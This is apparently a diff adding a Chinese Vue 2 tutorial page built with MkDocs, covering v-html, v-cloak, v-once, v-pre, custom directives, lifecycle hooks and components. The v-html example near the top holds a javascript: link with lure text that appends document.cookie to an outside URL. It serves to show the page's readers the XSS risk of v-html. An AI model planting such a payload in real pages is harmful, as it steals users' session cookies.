+        &lt;!-- 引入Vue --&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;root&quot;&gt;
+            &lt;div&gt;你好，{{name}}&lt;/div&gt;
+            &lt;div v-html=&quot;str&quot;&gt;&lt;/div&gt;
+            &lt;div v-html=&quot;str2&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+        new Vue({
+            el:'#root',
+            data:{
+                name:'尚硅谷',
+                str:'&lt;h3&gt;你好啊！&lt;/h3&gt;',
+                str2:'&lt;a href=javascript:location.href=&quot;http://www.baidu.com?&quot;+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;',
+            }
+        })
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="153-v-cloak">15.3 v-cloak指令</h2>
+<pre><code>v-cloak指令（没有值）：
+   1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+   2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;v-cloak指令&lt;/title&gt;
+        &lt;style&gt;
+            [v-cloak]{
+                display:none;
+            }
+        &lt;/style&gt;
+        &lt;!-- 引入Vue --&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;root&quot;&gt;
+            &lt;h2 v-cloak&gt;{{name}}&lt;/h2&gt;
+        &lt;/div&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;http://localhost:8080/resource/5s/vue.js&quot;&gt;&lt;/script&gt;
+    &lt;/body&gt;
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        console.log(1)
+        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+        new Vue({
+            el:'#root',
+            data:{
+                name:'尚硅谷'
+            }
+        })
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="154-v-once">15.4 v-once指令</h2>
+<pre><code>v-once指令：
+   1.v-once所在节点在初次动态渲染后，就视为静态内容了。
+   2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;v-once指令&lt;/title&gt;
+        &lt;!-- 引入Vue --&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;root&quot;&gt;
+            &lt;h2 v-once&gt;初始化的n值是:{{n}}&lt;/h2&gt;
+            &lt;h2&gt;当前的n值是:{{n}}&lt;/h2&gt;
+            &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+        new Vue({
+            el:'#root',
+            data:{
+                n:1
+            }
+        })
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="155-v-pre">15.5 v-pre指令</h2>
+<pre><code>v-pre指令：
+   1.跳过其所在节点的编译过程。
+   2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;v-pre指令&lt;/title&gt;
+        &lt;!-- 引入Vue --&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;!-- 准备好一个容器--&gt;
+        &lt;div id=&quot;root&quot;&gt;
+            &lt;h2 v-pre&gt;Vue其实很简单&lt;/h2&gt;
+            &lt;h2 &gt;当前的n值是:{{n}}&lt;/h2&gt;
+            &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+        new Vue({
+            el:'#root',
+            data:{
+                n:1
+            }
+        })
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h1 id="_13">十六、自定义指令</h1>
+<pre><code>需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
+需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点
+自定义指令总结：
+   一、定义语法：
+      (1).局部指令：
+         new Vue({                                          new Vue({
+            directives:{指令名:配置对象}   或             directives{指令名:回调函数}
+         })                                                     })
+      (2).全局指令：
+         Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
+   二、配置对象中常用的3个回调：
+      (1).bind：指令与元素成功绑定时调用。
+      (2).inserted：指令所在元素被插入页面时调用。
+      (3).update：指令所在模板结构被重新解析时调用。
+   三、备注：
+      1.指令定义时不加v-，但使用时要加v-；
+      2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;自定义指令&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2&gt;{{name}}&lt;/h2&gt;
+      &lt;h2&gt;当前的n值是：&lt;span v-text=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt;
+      &lt;!-- &lt;h2&gt;放大10倍后的n值是：&lt;span v-big-number=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt; --&gt;
+      &lt;h2&gt;放大10倍后的n值是：&lt;span v-big=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt;
+      &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;
+      &lt;hr /&gt;
+      &lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false
+
+   //定义全局指令
+   /* Vue.directive('fbind',{
+      //指令与元素成功绑定时（一上来）
+      bind(element,binding){
+         element.value = binding.value
+      },
+      //指令所在元素被插入页面时
+      inserted(element,binding){
+         element.focus()
+      },
+      //指令所在的模板被重新解析时
+      update(element,binding){
+         element.value = binding.value
+      }
+   }) */
+
+   new Vue({
+      el: '#root',
+      data: {
+         name: '尚硅谷',
+         n: 1
+      },
+      directives: {
+         //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
+         /* 'big-number'(element,binding){
+            // console.log('big')
+            element.innerText = binding.value * 10
+         }, */
+         big(element, binding) {
+            console.log('big', this) //注意此处的this是window
+            // console.log('big')
+            element.innerText = binding.value * 10
+         },
+         fbind: {
+            //指令与元素成功绑定时（一上来）
+            bind(element, binding) {
+               element.value = binding.value
+            },
+            //指令所在元素被插入页面时
+            inserted(element, binding) {
+               element.focus()
+            },
+            //指令所在的模板被重新解析时
+            update(element, binding) {
+               element.value = binding.value
+            }
+         }
+      }
+   })
+
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_14">十七、生命周期</h1>
+<h2 id="171">17.1 什么是生命周期</h2>
+<pre><code>生命周期：
+   1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
+   2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
+   3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
+   4.生命周期函数中的this指向是vm 或 组件实例对象。
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;引出生命周期&lt;/title&gt;
+        &lt;!-- 引入Vue --&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;root&quot;&gt;
+            &lt;h2 v-if=&quot;a&quot;&gt;你好啊&lt;/h2&gt;
+            &lt;h2 :style=&quot;{opacity}&quot;&gt;欢迎学习Vue&lt;/h2&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+         new Vue({
+            el:'#root',
+            data:{
+                a:false,
+                opacity:1
+            },
+            methods: {
+
+            },
+            //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
+            mounted(){
+                console.log('mounted',this)
+                setInterval(() =&gt; {
+                    this.opacity -= 0.01
+                    if(this.opacity &lt;= 0) this.opacity = 1
+                },16)
+            },
+        })
+
+        //通过外部的定时器实现（不推荐）
+        /* setInterval(() =&gt; {
+            vm.opacity -= 0.01
+            if(vm.opacity &lt;= 0) vm.opacity = 1
+        },16) */
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="172">17.2 分析生命周期</h2>
+<p><img alt="生命周期" src="../assets/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;分析生命周期&lt;/title&gt;
+   &lt;!-- 引入Vue --&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;!-- 准备好一个容器--&gt;
+   &lt;div id=&quot;root&quot; :x=&quot;n&quot;&gt;
+      &lt;h2 v-text=&quot;n&quot;&gt;&lt;/h2&gt;
+      &lt;h2&gt;当前的n值是：{{n}}&lt;/h2&gt;
+      &lt;button @click=&quot;add&quot;&gt;点我n+1&lt;/button&gt;
+      &lt;button @click=&quot;bye&quot;&gt;点我销毁vm&lt;/button&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+   new Vue({
+      el: '#root',
+      // template:`
+      //    &lt;div&gt;
+      //        &lt;h2&gt;当前的n值是：{{n}}&lt;/h2&gt;
+      //        &lt;button @click=&quot;add&quot;&gt;点我n+1&lt;/button&gt;
+      //    &lt;/div&gt;
+      // `,
+      data: {
+         n: 1
+      },
+      methods: {
+         add() {
+            console.log('add')
+            this.n++
+         },
+         bye() {
+            console.log('bye')
+            this.$destroy()
+         }
+      },
+      watch: {
+         n() {
+            console.log('n变了')
+         }
+      },
+      beforeCreate() {
+         console.log('beforeCreate')
+      },
+      created() {
+         console.log('created')
+      },
+      beforeMount() {
+         console.log('beforeMount')
+      },
+      mounted() {
+         console.log('mounted')
+      },
+      beforeUpdate() {
+         console.log('beforeUpdate')
+      },
+      updated() {
+         console.log('updated')
+      },
+      beforeDestroy() {
+         console.log('beforeDestroy')
+      },
+      destroyed() {
+         console.log('destroyed')
+      },
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="173">17.3 总结生命周期</h2>
+<pre><code>常用的生命周期钩子：
+   1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
+   2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
+关于销毁Vue实例
+   1.销毁后借助Vue开发者工具看不到任何信息。
+   2.销毁后自定义事件会失效，但原生DOM事件依然有效。
+   3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;引出生命周期&lt;/title&gt;
+   &lt;!-- 引入Vue --&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h2 :style=&quot;{opacity}&quot;&gt;欢迎学习Vue&lt;/h2&gt;
+      &lt;button @click=&quot;opacity = 1&quot;&gt;透明度设置为1&lt;/button&gt;
+      &lt;button @click=&quot;stop&quot;&gt;点我停止变换&lt;/button&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+   new Vue({
+      el: '#root',
+      data: {
+         opacity: 1
+      },
+      methods: {
+         stop() {
+            this.$destroy()
+         }
+      },
+      //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
+      mounted() {
+         console.log('mounted', this)
+         this.timer = setInterval(() =&gt; {
+            console.log('setInterval')
+            this.opacity -= 0.01
+            if (this.opacity &lt;= 0) this.opacity = 1
+         }, 16)
+      },
+      beforeDestroy() {
+         clearInterval(this.timer)
+         console.log('vm即将驾鹤西游了')
+      },
+   })
+
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h1 id="_15">十八、非单文件组件</h1>
+<h2 id="181">18.1 基本使用</h2>
+<pre><code>Vue中使用组件的三大步骤：
+   一、定义组件(创建组件)
+   二、注册组件
+   三、使用组件(写组件标签)
+
+一、如何定义一个组件？
+   使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
+   区别如下：
+      1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
+      2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
+   备注：使用template可以配置组件结构。
+
+二、如何注册组件？
+   1.局部注册：靠new Vue的时候传入components选项
+   2.全局注册：靠Vue.component('组件名',组件)
+
+三、编写组件标签：
+   &lt;school&gt;&lt;/school&gt;
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;基本使用&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;!-- 准备好一个容器--&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;hello&gt;&lt;/hello&gt;
+      &lt;hr&gt;
+      &lt;h1&gt;{{msg}}&lt;/h1&gt;
+      &lt;hr&gt;
+      &lt;!-- 第三步：编写组件标签 --&gt;
+      &lt;school&gt;&lt;/school&gt;
+      &lt;hr&gt;
+      &lt;!-- 第三步：编写组件标签 --&gt;
+      &lt;student&gt;&lt;/student&gt;
+   &lt;/div&gt;
+
+   &lt;div id=&quot;root2&quot;&gt;
+      &lt;hello&gt;&lt;/hello&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false
+
+   //第一步：创建school组件
+   const school = Vue.extend({
+      template: `
+                &lt;div class=&quot;demo&quot;&gt;
+                    &lt;h2&gt;学校名称：{{schoolName}}&lt;/h2&gt;
+                    &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt;
+                    &lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;  
+                &lt;/div&gt;
+            `,
+      // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
+      data() {
+         return {
+            schoolName: '尚硅谷',
+            address: '北京昌平'
+         }
+      },
+      methods: {
+         showName() {
+            alert(this.schoolName)
+         }
+      },
+   })
+
+   //第一步：创建student组件
+   const student = Vue.extend({
+      template: `
+                &lt;div&gt;
+                    &lt;h2&gt;学生姓名：{{studentName}}&lt;/h2&gt;
+                    &lt;h2&gt;学生年龄：{{age}}&lt;/h2&gt;
+                &lt;/div&gt;
+            `,
+      data() {
+         return {
+            studentName: '张三',
+            age: 18
+         }
+      }
+   })
+
+   //第一步：创建hello组件
+   const hello = Vue.extend({
+      template: `
+                &lt;div&gt;   
+                    &lt;h2&gt;你好啊！{{name}}&lt;/h2&gt;
+                &lt;/div&gt;
+            `,
+      data() {
+         return {
+            name: 'Tom'
+         }
+      }
+   })
+
+   //第二步：全局注册组件
+   Vue.component('hello', hello)
+
+   //创建vm
+   new Vue({
+      el: '#root',
+      data: {
+         msg: '你好啊！'
+      },
+      //第二步：注册组件（局部注册）
+      components: {
+         school,
+         student
+      }
+   })
+
+   new Vue({
+      el: '#root2',
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="182">18.2 注意的点</h2>
+<pre><code>几个注意点：
+   1.关于组件名:
+      一个单词组成：
+         第一种写法(首字母小写)：school
+         第二种写法(首字母大写)：School
+      多个单词组成：
+         第一种写法(kebab-case命名)：my-school
+         第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
+      备注：
+      (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
+      (2).可以使用name配置项指定组件在开发者工具中呈现的名字。
+
+   2.关于组件标签:
+      第一种写法：&lt;school&gt;&lt;/school&gt;
+      第二种写法：&lt;school/&gt;
+      备注：不用使用脚手架时，&lt;school/&gt;会导致后续组件不能渲染。
+
+   3.一个简写方式：
+      const school = Vue.extend(options) 可简写为：const school = options
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;几个注意点&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;h1&gt;{{msg}}&lt;/h1&gt;
+      &lt;school&gt;&lt;/school&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false
+
+   //定义组件
+   const s = Vue.extend({
+      name: 'atguigu',
+      template: `
+                &lt;div&gt;
+                    &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt;  
+                    &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt;   
+                &lt;/div&gt;
+            `,
+      data() {
+         return {
+            name: '尚硅谷',
+            address: '北京'
+         }
+      }
+   })
+
+   new Vue({
+      el: '#root',
+      data: {
+         msg: '欢迎学习Vue!'
+      },
+      components: {
+         school: s
+      }
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="183">18.3 组件的嵌套</h2>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;组件的嵌套&lt;/title&gt;
+   &lt;!-- 引入Vue --&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;!-- 准备好一个容器--&gt;
+   &lt;div id=&quot;root&quot;&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+   //定义student组件
+   const student = Vue.extend({
+      name: 'student',
+      template: `
+                &lt;div&gt;
+                    &lt;h2&gt;学生姓名：{{name}}&lt;/h2&gt;  
+                    &lt;h2&gt;学生年龄：{{age}}&lt;/h2&gt;   
+                &lt;/div&gt;
+            `,
+      data() {
+         return {
+            name: '尚硅谷',
+            age: 18
+         }
+      }
+   })
+
+   //定义school组件
+   const school = Vue.extend({
+      name: 'school',
+      template: `
+                &lt;div&gt;
+                    &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt;  
+                    &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt;   
+                    &lt;student&gt;&lt;/student&gt;
+                &lt;/div&gt;
+            `,
+      data() {
+         return {
+            name: '尚硅谷',
+            address: '北京'
+         }
+      },
+      //注册组件（局部）
+      components: {
+         student
+      }
+   })
+
+   //定义hello组件
+   const hello = Vue.extend({
+      template: `&lt;h1&gt;{{msg}}&lt;/h1&gt;`,
+      data() {
+         return {
+            msg: '欢迎来到尚硅谷学习！'
+         }
+      }
+   })
+
+   //定义app组件
+   const app = Vue.extend({
+      template: `
+                &lt;div&gt;   
+                    &lt;hello&gt;&lt;/hello&gt;
+                    &lt;school&gt;&lt;/school&gt;
+                &lt;/div&gt;
+            `,
+      components: {
+         school,
+         hello
+      }
+   })
+
+   //创建vm
+   new Vue({
+      template: '&lt;app&gt;&lt;/app&gt;',
+      el: '#root',
+      //注册组件（局部）
+      components: { app }
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="184-vuecomponent">18.4 VueComponent</h2>
+<pre><code>关于VueComponent：
+   1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
+
+   2.我们只需要写&lt;school/&gt;或&lt;school&gt;&lt;/school&gt;，Vue解析时会帮我们创建school组件的实例对象，
+      即Vue帮我们执行的：new VueComponent(options)。
+
+   3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
+
+   4.关于this指向：
+      (1).组件配置中：
+         data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
+      (2).new Vue(options)配置中：
+         data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
+
+   5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
+      Vue的实例对象，以后简称vm。
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+   &lt;meta charset=&quot;UTF-8&quot; /&gt;
+   &lt;title&gt;VueComponent&lt;/title&gt;
+   &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+   &lt;div id=&quot;root&quot;&gt;
+      &lt;school&gt;&lt;/school&gt;
+      &lt;hello&gt;&lt;/hello&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+   Vue.config.productionTip = false
+
+   //定义school组件
+   const school = Vue.extend({
+      name: 'school',
+      template: `
+                &lt;div&gt;
+                    &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt;  
+                    &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt;   
+                    &lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;
+                &lt;/div&gt;
+            `,
+      data() {
+         return {
+            name: '尚硅谷',
+            address: '北京'
+         }
+      },
+      methods: {
+         showName() {
+            console.log('showName', this)
+         }
+      },
+   })
+
+   const test = Vue.extend({
+      template: `&lt;span&gt;atguigu&lt;/span&gt;`
+   })
+
+   //定义hello组件
+   const hello = Vue.extend({
+      template: `
+                &lt;div&gt;
+                    &lt;h2&gt;{{msg}}&lt;/h2&gt;
+                    &lt;test&gt;&lt;/test&gt;   
+                &lt;/div&gt;
+            `,
+      data() {
+         return {
+            msg: '你好啊！'
+         }
+      },
+      components: { test }
+   })
+
+
+   // console.log('@',school)
+   // console.log('#',hello)
+
+   //创建vm
+   const vm = new Vue({
+      el: '#root',
+      components: { school, hello }
+   })
+&lt;/script&gt;
+
+&lt;/html&gt;
+</code></pre>
+<h2 id="185">18.5 一个重要的内置关系</h2>
+<p><img alt="image-20221226105306687" src="../assets/image-20221226105306687.png" /></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+        &lt;title&gt;一个重要的内置关系&lt;/title&gt;
+        &lt;!-- 引入Vue --&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;root&quot;&gt;
+            &lt;school&gt;&lt;/school&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+        Vue.prototype.x = 99
+
+        //定义school组件
+        const school = Vue.extend({
+            name:'school',
+            template:`
+                &lt;div&gt;
+                    &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt;  
+                    &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt;   
+                    &lt;button @click=&quot;showX&quot;&gt;点我输出x&lt;/button&gt;
+                &lt;/div&gt;
+            `,
+            data(){
+                return {
+                    name:'尚硅谷',
+                    address:'北京'
+                }
+            },
+            methods: {
+                showX(){
+                    console.log(this.x)
+                }
+            },
+        })
+
+        //创建一个vm
+        const vm = new Vue({
+            el:'#root',
+            data:{
+                msg:'你好'
+            },
+            components:{school}
+        })
+
+
+        //定义一个构造函数
+        /* function Demo(){
+            this.a = 1
+            this.b = 2
+        }
+        //创建一个Demo的实例对象
+        const d = new Demo()
+
+        console.log(Demo.prototype) //显示原型属性
+
+        console.log(d.__proto__) //隐式原型属性
+
+        console.log(Demo.prototype === d.__proto__)
+
+        //程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
+        Demo.prototype.x = 99
+
+        console.log('@',d) */
+
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.efa0ade1.min.js"></script>
+      
+    
+  </body>
+</html>
